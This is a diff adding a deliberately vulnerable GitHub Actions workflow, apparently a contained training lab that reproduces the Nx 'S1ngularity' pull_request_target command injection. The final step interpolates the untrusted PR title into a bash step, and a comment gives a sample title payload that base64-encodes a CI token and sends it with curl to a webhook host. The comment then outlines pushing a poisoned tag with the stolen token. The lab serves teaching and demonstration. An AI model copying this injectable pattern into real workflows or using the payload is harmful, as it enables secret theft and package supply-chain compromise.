@@ -1,0 +1,52 @@
+name: PR title validation (INTENTIONALLY VULNERABLE)
+
+# Training workflow. Reproduces the Nx S1ngularity root cause: pull_request_target plus
+# interpolation of the attacker-controlled PR title into a shell run: block. The
+# injected command runs in CI and can read this job's secrets, including the npm publish
+# token (NPM_AUTH_TOKEN) that a title check should never have had within reach.
+#
+# On stage the attacker's PR title carries a payload that exfiltrates the PAT, e.g.:
+#   fix: hi $(printf %s "$CI_PAT" | base64 | curl -s --data-binary @- "$WEBHOOK")
+# The stolen PAT is then used (from the laptop) to push a poisoned tag, which triggers
+# publish.yml. A PAT-authored push DOES start workflows; a GITHUB_TOKEN one does not.
+
+on:
+  pull_request_target:
+    types: [opened, edited, synchronize, reopened]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: ar-lab-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  validate-title:
+    # Containment: only a fork owned by an allowlisted demo actor, and the PR author must
+    # be an allowlisted login too. Set repo variable LAB_ACTORS to a JSON array of the
+    # allowed fork accounts, e.g.  ["your-login","arnabroy24"]
+    if: >-
+      github.event.pull_request.head.repo.fork == true &&
+      contains(fromJSON(vars.LAB_ACTORS), github.event.pull_request.head.repo.owner.login) &&
+      contains(fromJSON(vars.LAB_ACTORS), github.event.pull_request.user.login)
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    env:
+      # The overreach: a title check handed a broad automation PAT it never needed. The
+      # injection exfiltrates it. Unlike GITHUB_TOKEN, a PAT CAN trigger other workflows,
+      # which is how the attacker reaches publish.yml. Use a DISPOSABLE fine-grained PAT
+      # scoped to THIS repo only (contents: write), and rotate it right after the demo.
+      CI_PAT: ${{ secrets.CI_PAT }}
+    steps:
+      - name: Check out trusted base revision
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          ref: ${{ github.event.pull_request.base.sha }}
+          persist-credentials: false
+          fetch-depth: 1
+
+      - name: Validate PR title (vulnerable sink)
+        shell: bash
+        run: |
+          echo "Validating PR title: ${{ github.event.pull_request.title }}"
